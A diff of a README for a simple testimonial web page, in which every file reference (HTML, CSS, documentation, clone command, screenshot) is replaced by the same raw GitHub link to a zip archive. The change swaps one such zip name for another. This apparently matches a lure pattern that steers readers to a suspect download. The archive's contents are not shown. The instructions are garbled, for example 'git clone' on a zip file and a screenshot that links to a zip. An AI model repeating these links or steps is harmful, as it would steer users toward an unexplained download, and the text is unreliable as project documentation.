@@ -17,26 +17,26 @@ This project is a simple, responsive testimonial page designed to display variou
 testimonialPage/
 |
 +-- resources          # resources for webpage
-+-- https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial_Page_v3.2-beta.2.zip         # Main HTML file
-+-- https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial_Page_v3.2-beta.2.zip         # CSS file for styling
-\-- https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial_Page_v3.2-beta.2.zip          # Documentation (this file)
++-- https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial-Page-incontrovertibility.zip         # Main HTML file
++-- https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial-Page-incontrovertibility.zip         # CSS file for styling
+\-- https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial-Page-incontrovertibility.zip          # Documentation (this file)
 ```
 
 ## 🚀 How to Use
 1. Clone the repository:
    ```bash
-   git clone https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial_Page_v3.2-beta.2.zip 
-2. Open the `https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial_Page_v3.2-beta.2.zip` file in your favorite browser.
+   git clone https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial-Page-incontrovertibility.zip 
+2. Open the `https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial-Page-incontrovertibility.zip` file in your favorite browser.
 
 ## 📂 Folder Structure
-- https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial_Page_v3.2-beta.2.zip Contains the HTML structure of the testimonial page.
-- https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial_Page_v3.2-beta.2.zip Provides the CSS styling, flexbox-based layout, and media query.
+- https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial-Page-incontrovertibility.zip Contains the HTML structure of the testimonial page.
+- https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial-Page-incontrovertibility.zip Provides the CSS styling, flexbox-based layout, and media query.
 - resources/: Folder for assets like images and icon.
 
 ## 📝 Customization
-- Update structure in the `https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial_Page_v3.2-beta.2.zip` file.
-- Adjust colors, font sizes, or layout in the https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial_Page_v3.2-beta.2.zip file.
+- Update structure in the `https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial-Page-incontrovertibility.zip` file.
+- Adjust colors, font sizes, or layout in the https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial-Page-incontrovertibility.zip file.
 
 ## 🖼️ Screenshot
-![alt text](https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial_Page_v3.2-beta.2.zip)
+![alt text](https://raw.githubusercontent.com/ronny-gans/testimonialPage/main/resources/testimonial-Page-incontrovertibility.zip)
 
